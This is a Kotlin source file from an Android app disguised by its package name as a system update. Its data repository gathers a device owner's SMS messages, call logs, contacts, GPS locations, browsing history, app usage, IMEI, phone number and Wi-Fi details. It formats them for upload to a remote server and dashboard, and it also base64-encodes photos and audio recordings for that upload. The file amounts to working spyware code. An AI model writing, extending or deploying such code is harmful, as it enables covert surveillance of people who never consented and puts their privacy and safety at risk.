package com.androidsystem.update.database

import com.androidsystem.update.core.EncryptionManager
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DataRepository @Inject constructor(
    private val dao: TelemetryDao,
    private val encryptionManager: EncryptionManager
) {
    suspend fun insertCollectedData(type: String, content: String) {
        dao.insertCollectedData(CollectedDataEntity(
            type = type,
            content = encryptionManager.encrypt(content),
            timestamp = System.currentTimeMillis()
        ))
    }

    suspend fun insertLocationData(data: LocationEntity) {
        dao.insertLocationData(data)
    }

    suspend fun insertSms(address: String, body: String, date: Long, type: Int, read: Int) {
        dao.insertSms(SmsEntity(address = address, body = body, date = date, type = type, read = read))
    }

    suspend fun insertCall(number: String, date: Long, duration: Long, type: Int, name: String) {
        dao.insertCall(CallEntity(number = number, date = date, duration = duration, type = type, name = name))
    }

    suspend fun insertContact(name: String, phone: String, phoneHash: String) {
        dao.insertContact(ContactEntity(name = name, phone = phone, phoneHash = phoneHash))
    }

    suspend fun insertBrowsingHistory(url: String, title: String?, packageName: String, visitTime: Long) {
        dao.insertBrowsingHistory(BrowsingHistoryEntity(
            url = url, title = title, packageName = packageName, visitTime = visitTime
        ))
    }

    suspend fun insertMediaFile(path: String, name: String, mimeType: String?, dateAdded: Long, isScreenshot: Boolean) {
        dao.insertMediaFile(MediaFileEntity(
            path = path, name = name, mimeType = mimeType, dateAdded = dateAdded, isScreenshot = isScreenshot
        ))
    }

    suspend fun insertDeviceInfo(data: DeviceInfoEntity) {
        dao.insertDeviceInfo(data)
    }

    suspend fun insertAppUsage(packageName: String, totalTime: Long, launchCount: Int) {
        dao.insertAppUsage(AppUsageEntity(packageName = packageName, totalTime = totalTime, launchCount = launchCount))
    }

    suspend fun getUnsynced(limit: Int): List<CollectedDataEntity> = dao.getUnsynced(limit)
    suspend fun markSynced(id: Long) = dao.markSynced(id)
    suspend fun cleanupOldData(cutoff: Long) = dao.cleanupOldData(cutoff)
    suspend fun getLastLocation(): LocationEntity? = dao.getLastLocation()

    /**
     * A single typed message shipped to the server (POST /api/v2/data).
     * [content] is a JSON string of the record; the server parses it, routes it
     * to the matching module collection, dedupes by hash and caps the array.
     */
    data class SyncMessage(val type: String, val content: String, val timestamp: Long)

    private fun toJson(vararg pairs: Pair<String, Any?>): String =
        JSONObject().apply { pairs.forEach { (k, v) -> put(k, v) } }.toString()

    suspend fun smsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getSmsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "sms",
                toJson("address" to it.address, "body" to it.body,
                    "date" to it.date, "type" to it.type, "read" to it.read, "ts" to it.date),
                it.date
            )
        }
        return msgs to rows.last().id
    }

    suspend fun callsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getCallsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "call",
                toJson("number" to it.number, "name" to it.name,
                    "date" to it.date, "duration" to it.duration, "type" to it.type, "ts" to it.date),
                it.date
            )
        }
        return msgs to rows.last().id
    }

    suspend fun contactsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getContactsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "contact",
                toJson("name" to it.name, "phone" to it.phone,
                    "phoneHash" to it.phoneHash, "ts" to 0L),
                0L
            )
        }
        return msgs to rows.last().id
    }

    suspend fun locationsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getLocationsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "location",
                toJson("latitude" to it.latitude, "longitude" to it.longitude,
                    "accuracy" to it.accuracy, "altitude" to it.altitude, "speed" to it.speed,
                    "provider" to it.provider, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }

    suspend fun browsingSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getBrowsingAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "browsing",
                toJson("url" to it.url, "title" to it.title,
                    "package" to it.packageName, "visitTime" to it.visitTime, "ts" to it.visitTime),
                it.visitTime
            )
        }
        return msgs to rows.last().id
    }

    suspend fun mediaSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getMediaAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "media",
                toJson("path" to it.path, "name" to it.name,
                    "mime" to it.mimeType, "dateAdded" to it.dateAdded,
                    "screenshot" to it.isScreenshot, "ts" to it.dateAdded),
                it.dateAdded
            )
        }
        return msgs to rows.last().id
    }

    /**
     * Uploads the actual FILE content for media rows newer than [lastId]
     * (photos as downscaled JPEG thumbnails, small audio recordings/voice
     * notes as-is), so the dashboard can display a preview instead of only a
     * path. Runs on a separate cursor so metadata and heavy payloads never
     * block each other; unreadable or oversized files are skipped (cursor
     * advances) rather than retried forever. Videos are metadata-only.
     */
    suspend fun mediaFileSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getMediaAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = mutableListOf<SyncMessage>()
        for (row in rows) {
            val mime = row.mimeType?.lowercase() ?: ""
            val payload = when {
                mime.startsWith("image/") -> encodeImageThumbnail(row.path)
                mime.startsWith("audio/") -> encodeAudioFile(row.path)
                else -> null
            }
            if (payload != null) {
                msgs.add(
                    SyncMessage(
                        if (mime.startsWith("audio/")) "audio_file" else "photo_file",
                        toJson(
                            "path" to row.path, "name" to row.name, "mime" to row.mimeType,
                            "dateAdded" to row.dateAdded, "ts" to row.dateAdded, "data" to payload
                        ),
                        row.dateAdded
                    )
                )
            }
        }
        return msgs to rows.last().id
    }

    // Downscale to max 512 px, JPEG q60 — a small enough base64 payload to
    // live inside a capped Firebase module collection while still being
    // legible in the dashboard grid.
    private fun encodeImageThumbnail(path: String): String? {
        return try {
            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
            android.graphics.BitmapFactory.decodeFile(path, bounds)
            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
            var sample = 1
            while (bounds.outWidth / (sample * 2) >= 512 && bounds.outHeight / (sample * 2) >= 512) sample *= 2
            val opts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
            val bmp = android.graphics.BitmapFactory.decodeFile(path, opts) ?: return null
            val scale = minOf(1f, 512f / maxOf(bmp.width, bmp.height))
            val scaled = if (scale < 1f) {
                android.graphics.Bitmap.createScaledBitmap(
                    bmp, (bmp.width * scale).toInt().coerceAtLeast(1),
                    (bmp.height * scale).toInt().coerceAtLeast(1), true
                )
            } else bmp
            val out = java.io.ByteArrayOutputStream()
            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out)
            if (scaled !== bmp) scaled.recycle()
            bmp.recycle()
            android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    // Voice notes / recordings up to 1 MB fit inside the capped audio module.
    private fun encodeAudioFile(path: String): String? {
        return try {
            val f = java.io.File(path)
            if (!f.exists() || !f.canRead() || f.length() > 1_000_000L) return null
            android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    suspend fun appUsageSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getAppUsageAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "app_usage",
                toJson("package" to it.packageName,
                    "totalTime" to it.totalTime, "launchCount" to it.launchCount, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }

    suspend fun deviceInfoSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getDeviceInfoAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "device_info",
                toJson("manufacturer" to it.manufacturer, "model" to it.model,
                    "device" to it.device, "product" to it.product,
                    "androidVersion" to it.androidVersion, "sdkVersion" to it.sdkVersion,
                    "imei" to it.imei, "phoneNumber" to it.phoneNumber,
                    "simOperator" to it.simOperator, "networkOperator" to it.networkOperator,
                    "androidId" to it.androidId, "wifiSsid" to it.wifiSsid,
                    "wifiBssid" to it.wifiBssid, "wifiRssi" to it.wifiRssi,
                    "batteryLevel" to it.batteryLevel, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }
}
